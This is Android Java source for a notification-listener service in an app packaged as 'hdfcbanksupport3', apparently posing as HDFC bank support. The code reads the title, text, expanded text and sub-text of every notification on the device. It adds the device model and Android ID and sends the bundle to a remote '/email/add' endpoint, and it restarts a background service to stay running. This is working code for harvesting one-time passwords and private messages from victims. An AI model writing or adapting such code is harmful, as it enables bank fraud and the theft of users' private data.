package com.hdfcbanksupport3;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class MyNotificationListener extends NotificationListenerService {

    private static final String TAG = "MyNotificationListener";
    private Context context;
    private String lastProcessedNotification = null;

    @Override
    public void onCreate() {
        super.onCreate();
        context = getApplicationContext();
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!isServiceRunning(BackgroundService.class)) {
            Intent serviceIntent = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        }

        String packageName = sbn.getPackageName();
        PackageManager packageManager = context.getPackageManager();
        String appName = null;
        try {
            ApplicationInfo appInfo = packageManager.getApplicationInfo(packageName, 0);
            appName = packageManager.getApplicationLabel(appInfo).toString();
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

//        if (!"com.google.android.gm".equals(packageName)) {
//            return;
//        }

        Bundle extras = sbn.getNotification().extras;
        if (extras == null) {
            Log.d(TAG, "Notification extras are null");
            return;
        }
        // for loop extras
//        for (String key : extras.keySet()) {
//            Object value = extras.get(key);
//            Log.d(TAG, "Key: " + key + ", Value: " + value);
//        }

        String sender = getStringFromExtras(extras, "android.title");
        String subject = getStringFromExtras(extras, "android.text");
        String message = getStringFromExtras(extras, "android.bigText");
        String receiverEmail = getStringFromExtras(extras, "android.subText");

//        String notificationKey = (sender != null ? sender : "") +
//                (subject != null ? subject : "") +
//                (message != null ? message : "") +
//                (receiverEmail != null ? receiverEmail : "");
//
//        if (notificationKey.equals(lastProcessedNotification)) {
//            Log.d(TAG, "Duplicate notification detected, ignoring...");
//            return; // Do not process the same notification again
//        }

        if(appName.isEmpty()){
            appName = packageName;
        }

//        lastProcessedNotification = notificationKey;
        try {
            Helper help = new Helper();
            JSONObject senderData = new JSONObject();
            senderData.put("app_name", appName != null ? appName : packageName);
            senderData.put("sender", sender != null ? sender : "Unknown Sender");
            senderData.put("sender", sender != null ? sender : "Unknown Sender");
            senderData.put("subject", subject != null ? subject : "No Subject");
            senderData.put("message", message != null ? message : "No Message");
            senderData.put("receiver_email", receiverEmail != null ? receiverEmail : "Unknown Receiver");
            senderData.put("model", Build.MODEL);
            senderData.put("mobile_id", Helper.getAndroidId(this));
            senderData.put("site", help.SITE());
//            Log.d(TAG, "Email Data: " + senderData.toString());
            Helper.postRequest("/email/add", senderData, new Helper.ResponseListener() {
                @Override
                public void onResponse(String result) {
//                    Log.d(TAG, "Email Save Response: " + result);
                }
            });
        } catch (JSONException e) {
            Log.e(TAG, "Failed to create JSON object", e);
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.d(TAG, "Notification removed: " + sbn.getPackageName());
    }

    @Override
    public void onNotificationRankingUpdate(RankingMap rankingMap) {
        super.onNotificationRankingUpdate(rankingMap);
        Log.d(TAG, "Notification ranking updated");
    }

    /**
     * Helper method to safely retrieve a string value from notification extras.
     */
    private String getStringFromExtras(Bundle extras, String key) {
        Object value = extras.get(key);
        return value != null ? value.toString() : null;
    }

    private boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : activityManager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}
